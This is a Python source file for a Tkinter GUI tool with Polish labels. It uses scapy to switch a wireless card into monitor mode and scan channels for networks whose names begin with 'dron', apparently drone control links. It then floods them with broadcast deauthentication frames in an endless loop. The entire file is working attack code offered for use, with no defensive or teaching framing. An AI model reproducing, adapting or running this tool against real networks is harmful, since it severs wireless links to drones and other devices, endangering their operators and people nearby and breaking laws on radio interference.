import tkinter as tk

from tkinter import ttk, messagebox

from threading import Thread, Event

import os

from scapy.all import *



INTERFACE = "wlan1"




def check_root():
    if os.geteuid() != 0:
        messagebox.showerror("Błąd", "Ten skrypt wymaga uprawnień root. Uruchom go jako root.")

        exit(1)


def configure_interface(interface, mode="monitor", channel=None):
    os.system(f"ifconfig {interface} down")

    os.system(f"iwconfig {interface} mode {mode}")

    if channel:
        os.system(f"iwconfig {interface} channel {channel}")

    os.system(f"ifconfig {interface} up")


def deauth(target, ap, interface):
    dot11 = Dot11(addr1=target, addr2=ap, addr3=ap)

    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)

    sendp(packet, iface=interface, count=100, inter=0.002, verbose=0)


def scan_network(interface, found_targets, scan_done_event, update_callback, iterations=7):
    channels_2ghz = list(range(1, 14))

    def packet_handler(packet):

        if packet.haslayer(Dot11Beacon) or packet.haslayer(Dot11ProbeResp):

            ssid = packet.info.decode(errors="ignore")

            bssid = packet.addr2

            try:

                channel = int(packet[Dot11Elt:3].info[0])

            except:

                return

            if ssid.startswith("dron") and (ssid, bssid, channel) not in found_targets:
                found_targets.append((ssid, bssid, channel))

                update_callback(f"SSID: {ssid}, BSSID: {bssid}, Kanał: {channel}")

    for _ in range(iterations):

        for channel in channels_2ghz:
            configure_interface(interface, channel=channel)

            sniff(iface=interface, timeout=0.2, prn=packet_handler)

    scan_done_event.set()


def attack_networks(interface, targets, update_callback):
    ap_broadcast = "FF:FF:FF:FF:FF:FF"

    while True:

        for _, bssid, _ in targets:
            deauth(ap_broadcast, bssid, interface)

            update_callback(f"Atakowanie BSSID: {bssid}")


class WiFiDeauthApp:

    def __init__(self, root):

        self.root = root

        self.root.title("WiFi Deauth App")

        self.interface = INTERFACE

        self.targets = []

        self.scan_done_event = Event()

        self.configure_styles()

        self.create_widgets()

    def configure_styles(self):


        self.root.configure(bg="#78909c")

        style = ttk.Style()

        style.configure("Custom.TFrame", background="#78909c")

    def create_widgets(self):


        self.paned_window = tk.PanedWindow(self.root, orient=tk.HORIZONTAL, bg="#78909c")

        self.paned_window.pack(fill=tk.BOTH, expand=1)

        self.left_frame = ttk.Frame(self.paned_window, padding=10, style="Custom.TFrame")

        self.paned_window.add(self.left_frame)

        ttk.Label(self.left_frame, text="Dostępne sieci:", font=("Arial", 12),

                  background="#78909c", foreground="white").pack(pady=5)

        self.results_listbox = tk.Listbox(self.left_frame, height=15, width=40,

                                          bg="#363636", fg="white",

                                          highlightbackground="#311b92",

                                          highlightthickness=0)

        self.results_listbox.pack(pady=5, fill=tk.BOTH, expand=1)

        self.scan_button = ttk.Button(self.left_frame, text="Skanuj sieci", command=self.start_scan)

        self.scan_button.pack(pady=5)

        self.right_frame = ttk.Frame(self.paned_window, padding=10, style="Custom.TFrame")

        self.paned_window.add(self.right_frame)

        ttk.Label(self.right_frame, text="Komunikaty:", font=("Arial", 12),

                  background="#78909c", foreground="white").pack(pady=5)

        self.messages_listbox = tk.Listbox(self.right_frame, height=15, width=40,

                                           bg="#363636", fg="#64dd17",

                                           highlightbackground="#311b92",

                                           highlightthickness=0)

        self.messages_listbox.pack(pady=5, fill=tk.BOTH, expand=1)

        self.attack_button = ttk.Button(self.right_frame, text="Rozpocznij atak", command=self.start_attack,
                                        state="disabled")

        self.attack_button.pack(pady=5)

    def show_modal_message(self, message):

        modal = tk.Toplevel(self.root)

        modal.title("Informacja")

        modal.geometry("300x100")

        modal.transient(self.root)

        modal.grab_set()

        modal.configure(bg="#64b5f6")

        ttk.Label(modal, text=message, font=("Arial", 12), background="#64b5f6", foreground="white").pack(expand=True,
                                                                                                          pady=20)

        return modal

    def update_results(self, message):

        self.results_listbox.insert(tk.END, message)

    def update_messages(self, message):

        self.messages_listbox.insert(tk.END, message)

    def start_scan(self):

        self.results_listbox.delete(0, tk.END)

        self.targets.clear()

        self.scan_done_event.clear()

        modal = self.show_modal_message("Skanowanie sieci...")

        self.scan_button.config(state="disabled") 

        Thread(target=self.scan_network_thread, args=(modal,)).start()

    def scan_network_thread(self, modal):

        configure_interface(self.interface, mode="monitor")

        scan_network(self.interface, self.targets, self.scan_done_event, self.update_results)

        modal.destroy()

        self.update_messages("Skanowanie zakończone.")

        self.scan_button.config(state="normal")

        self.attack_button.config(state="normal")

    def start_attack(self):

        if not self.targets:
            messagebox.showerror("Błąd", "Nie znaleziono żadnych celów do ataku.")

            return

        modal = self.show_modal_message("Zaczęto deautoryzację...")

        Thread(target=self.attack_networks_thread, args=(modal,)).start()

    def attack_networks_thread(self, modal):

        for _, bssid, _ in self.targets:
            self.update_messages(f"")

            attack_networks(self.interface, self.targets, self.update_messages)

        modal.destroy()


if __name__ == "__main__":
    check_root()

    root = tk.Tk()

    app = WiFiDeauthApp(root)

    root.mainloop()


